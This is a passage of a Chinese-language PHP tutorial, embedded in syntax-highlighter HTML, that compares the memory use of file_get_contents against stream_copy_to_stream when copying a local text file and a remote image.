file_get_contents(\"shakespeare.txt\")\r\n);\r\n\r\nrequire \"memory.php\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c965158925643-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c965158925643-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c965158925643-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c965158925643-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c965158925643-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c965158925643-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c965158925643-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c965158925643-1\"><span class=\"crayon-c\">// from piping-files-1.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c965158925643-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c965158925643-3\"><span class=\"crayon-e\">file_put_contents</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c965158925643-4\">    <span class=\"crayon-s\">\"piping-files-1.txt\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-e\">file_get_contents</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"shakespeare.txt\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c965158925643-5\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c965158925643-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c965158925643-7\"><span class=\"crayon-i\">require</span> <span class=\"crayon-s\">\"memory.php\"</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>不出所料，这个脚本使用更多的内存来进行文本文件复制。这是因为它读取(和保留)文件内容在内存中，直到它被写到新文件中。对于小文件这种方法也许没问题。当为更大的文件时，就捉襟见肘了…</p>\n<p>让我们尝试用流(管道)来传送一个文件到另一个：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c969669231962\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from piping-files-2.php\r\n\r\n$handle1 = fopen(\"shakespeare.txt\", \"r\");\r\n$handle2 = fopen(\"piping-files-2.txt\", \"w\");\r\n\r\nstream_copy_to_stream($handle1, $handle2);\r\n\r\nfclose($handle1);\r\nfclose($handle2);\r\n\r\nrequire \"memory.php\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c969669231962-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c969669231962-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c969669231962-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c969669231962-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c969669231962-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c969669231962-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c969669231962-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c969669231962-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c969669231962-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c969669231962-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c969669231962-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c969669231962-1\"><span class=\"crayon-c\">// from piping-files-2.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c969669231962-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c969669231962-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"shakespeare.txt\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"r\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c969669231962-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"piping-files-2.txt\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"w\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c969669231962-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c969669231962-6\"><span class=\"crayon-e\">stream_copy_to_stream</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c969669231962-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c969669231962-8\"><span class=\"crayon-e\">fclose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c969669231962-9\"><span class=\"crayon-e\">fclose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c969669231962-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c969669231962-11\"><span class=\"crayon-i\">require</span> <span class=\"crayon-s\">\"memory.php\"</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>这段代码稍微有点陌生。我们打开了两文件的句柄，第一个是只读模式，第二个是只写模式，然后我们从第一个复制到第二个中。最后我们关闭了它，也许使你惊讶，内存只占用了393KB</p>\n<p>这似乎很熟悉。像代码生成器在存储它读到的每一行代码？那是因为第二个参数fgets规定了每行读多少个字节（默认值是-1或者直到下一行为止）。</p>\n<p>第三个参数stream_copy_to_stream和第二个参数是同一类参数（默认值相同），stream_copy_to_stream一次从一个数据流里读一行，同时写到另一个数据流里。它跳过生成器只有一个值的部分（因为我们不需要这个值）。</p>\n<p>这篇文章对于我们来说可能是没用的，所以让我们想一些我们可能会用到的例子。假设我们想从我们的CDN中输出一张图片，作为一种重定向的路由应用程序。我们可以参照下边的代码来实现它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c96d465746413\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from piping-files-3.php\r\n\r\nfile_put_contents(\r\n    \"piping-files-3.jpeg\", file_get_contents(\r\n        \"https://github.com/assertchris/uploads/raw/master/rick.jpg\"\r\n    )\r\n);\r\n\r\n// ...or write this straight to stdout, if we don't need the memory info\r\n\r\nrequire \"memory.php\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c96d465746413-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c96d465746413-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c96d465746413-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c96d465746413-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c96d465746413-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c96d465746413-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c96d465746413-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c96d465746413-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c96d465746413-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c96d465746413-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c96d465746413-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c96d465746413-1\"><span class=\"crayon-c\">// from piping-files-3.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c96d465746413-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c96d465746413-3\"><span class=\"crayon-e\">file_put_contents</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c96d465746413-4\">    <span class=\"crayon-s\">\"piping-files-3.jpeg\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-e\">file_get_contents</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c96d465746413-5\">        <span class=\"crayon-s\">\"https://github.com/assertchris/uploads/raw/master/rick.jpg\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c96d465746413-6\">    <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c96d465746413-7\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c96d465746413-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c96d465746413-9\"><span class=\"crayon-c\">// ...or write this straight to stdout, if we don't need the memory info</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c96d465746413-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c96d465746413-11\"><span class=\"crayon-i\">require</span> <span class=\"crayon-s\">\"memory.php\"</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>设想一下，一个路由应用程序让我们看到这段代码。但是，我们想从CDN获取一个文件，而不是从本地的文件系统获取。我们可以用一些其他的东西来更好的替换file_get_contents（就像<a href=\"http://docs.guzzlephp.org/en/stable/\" rel=\"nofollow\">Guzzle</a>），即使在引擎内部它们几乎是一样的。</p>\n<p>图片的内存大概有581K。现在，让我们来试试这个</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c970024974034\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from piping-files-4.php\r\n\r\n$handle1 = fopen(\r\n    \"https://github.com/assertchris/uploads/raw/master/rick.jpg\", \"r\"\r\n);\r\n\r\n$handle2 = fopen(\r\n    \"piping-files-4.jpeg\", \"w\"\r\n);\r\n\r\n// ...or write this straight to stdout, if we don't need the memory info\r\n\r\nstream_copy_to_stream($handle1, $handle2);\r\n\r\nfclose($handle1);\r\nfclose($handle2);\r\n\r\nrequire \"memory.php\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c970024974034-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c970024974034-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c970024974034-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c970024974034-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c970024974034-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c970024974034-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c970024974034-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c970024974034-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c970024974034-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c970024974034-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c970024974034-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c970024974034-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c970024974034-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c970024974034-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c970024974034-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c970024974034-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c970024974034-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c970024974034-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c970024974034-1\"><span class=\"crayon-c\">// from piping-files-4.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c970024974034-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c970024974034-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c970024974034-4\">    <span class=\"crayon-s\">\"https://github.com/assertchris/uploads/raw/master/rick.jpg\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"r\"</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c970024974034-5\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c970024974034-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c970024974034-7\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c970024974034-8\">    <span class=\"crayon-s\">\"piping-files-4.jpeg\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"w\"</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c970024974034-9\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c970024974034-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c970024974034-11\"><span class=\"crayon-c\">// ...or write this straight to stdout, if we don't need the memory info</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c970024974034-12\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c970024974034-13\"><span class=\"crayon-e\">stream_copy_to_stream</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c970024974034-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c970024974034-15\"><span class=\"crayon-e\">fclose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c970024974034-16\"><span class=\"crayon-e\">fclose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c970024974034-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c970024974034-18\"><span class=\"crayon-i\">require</span> <span class=\"crayon-s\">\"memory.php\"</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>内存使用明显变少（大概<strong>400K</strong>），但是结果是一样的。如果我们不关注内存信息，我们依旧可以用标准模式输出。实际上，PHP提供了一个简单的方式来完成：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c974476112555\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$handle1 = fopen(\r\n    \"https://github.com/assertchris/uploads/raw/master/rick.jpg\", \"r\"\r\n);\r\n\r\n$handle2 = fopen(\r\n    \"php://stdout\", \"w\"\r\n);\r\n\r\nstream_copy_to_stream($handle1, $handle2);\r\n\r\nfclose($handle1);\r\nfclose($handle2);\r\n\r\n// require \"memory.php\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c974476112555-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c974476112555-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c974476112555-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c974476112555-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c974476112555-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c974476112555-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c974476112555-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c974476112555-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c974476112555-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c974476112555-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c974476112555-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c974476112555-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c974476112555-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c974476112555-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c974476112555-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c974476112555-2\">    <span class=\"crayon-s\">\"https://github.com/assertchris/uploads/raw/master/rick.jpg\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"r\"</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c974476112555-3\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c974476112555-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c974476112555-5\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c974476112555-6\">    <span class=\"crayon-s\">\"php://stdout\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"w\"</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c974476112555-7\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c974476112555-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c974476112555-9\"><span class=\"crayon-e\">stream_copy_to_stream</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c974476112555-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c974476112555-11\"><span class=\"crayon-e\">fclose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span 